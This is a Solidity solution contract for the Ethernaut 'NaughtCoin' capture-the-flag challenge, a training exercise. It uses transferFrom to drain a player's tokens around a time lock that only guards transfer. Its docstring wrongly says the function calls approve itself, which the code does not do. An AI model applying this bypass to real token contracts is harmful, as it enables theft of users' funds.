// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title INaughtCoin
 * @dev Interface for the NaughtCoin contract from the Ethernaut CTF challenge
 */
interface INaughtCoin {
    /**
     * @dev Returns the balance of tokens owned by an account
     * @param account The address to query the balance of
     * @return The number of tokens owned by the account
     */
    function balanceOf(address account) external view returns (uint256);
    
    /**
     * @dev Returns the remaining number of tokens that spender will be allowed to spend on behalf of owner
     * @param owner The address which owns the funds
     * @param spender The address which will spend the funds
     * @return The number of tokens still available for the spender
     */
    function allowance(address owner, address spender) external view returns (uint256);
    
    /**
     * @dev Sets amount as the allowance of spender over the caller's tokens
     * @param spender The address which will spend the funds
     * @param amount The amount of tokens to be spent
     * @return A boolean that indicates if the operation was successful
     */
    function approve(address spender, uint256 amount) external returns (bool);
    
    /**
     * @dev Moves amount tokens from sender to recipient
     * @param recipient The address to transfer tokens to
     * @param amount The amount of tokens to transfer
     * @return A boolean that indicates if the operation was successful
     */
    function transfer(address recipient, uint256 amount) external returns (bool);
    
    /**
     * @dev Moves amount tokens from sender to recipient using the allowance mechanism
     * @param sender The address to transfer tokens from
     * @param recipient The address to transfer tokens to
     * @param amount The amount of tokens to transfer
     * @return A boolean that indicates if the operation was successful
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    /**
     * @dev Returns the amount of tokens in existence
     * @return The total supply of tokens
     */
    function totalSupply() external view returns (uint256);
    
    /**
     * @dev Returns the address of the player (token holder)
     * @return The address of the player
     */
    function player() external view returns (address);
    
    /**
     * @dev Returns the initial supply of tokens
     * @return The initial supply amount
     */
    function INITIAL_SUPPLY() external view returns (uint256);
}

/**
 * @title NaughtCoinExploit
 * @dev Solution contract for the NaughtCoin Ethernaut challenge
 * @notice This contract exploits the incomplete token lock mechanism
 * @custom:security-contact security@example.com
 */
contract NaughtCoinExploit {
    /// @notice Reference to the target NaughtCoin contract
    INaughtCoin public naughtCoin;
    
    /// @notice Address of the target NaughtCoin contract
    address public naughtCoinAddress;
    
    /// @notice Address of the owner of this exploit contract
    address public owner;

    /**
     * @dev Constructor sets the address of the NaughtCoin contract to exploit
     * @param _naughtCoinAddress The address of the deployed NaughtCoin contract
     */
    constructor(address _naughtCoinAddress) {
        naughtCoinAddress = _naughtCoinAddress;
        naughtCoin = INaughtCoin(naughtCoinAddress);
        owner = msg.sender;
    }
    
    /**
     * @dev Bypasses the timelock by using the transferFrom function
     * @notice This function first approves the contract to spend tokens on behalf of the player,
     * then transfers all tokens to the specified address
     */
    function bypassTimeLock() external {
        require(msg.sender == owner, "Only owner can bypass the timelock");
        
        // Get the player's balance
        address player = naughtCoin.player();
        uint256 playerBalance = naughtCoin.balanceOf(player);
        
        // Transfer all tokens from the player to the contract address
        naughtCoin.transferFrom(player, address(this), playerBalance);
    }
    
    /**
     * @dev Helper function to check the player's token balance
     * @return The balance of tokens owned by the player
     */
    function getPlayerBalance() external view returns (uint256) {
        address player = naughtCoin.player();
        return naughtCoin.balanceOf(player);
    }
    
    /**
     * @dev Helper function to check if the exploit was successful
     * @return True if the player's balance is zero, false otherwise
     */
    function checkSuccess() external view returns (bool) {
        address player = naughtCoin.player();
        return naughtCoin.balanceOf(player) == 0;
    }
}
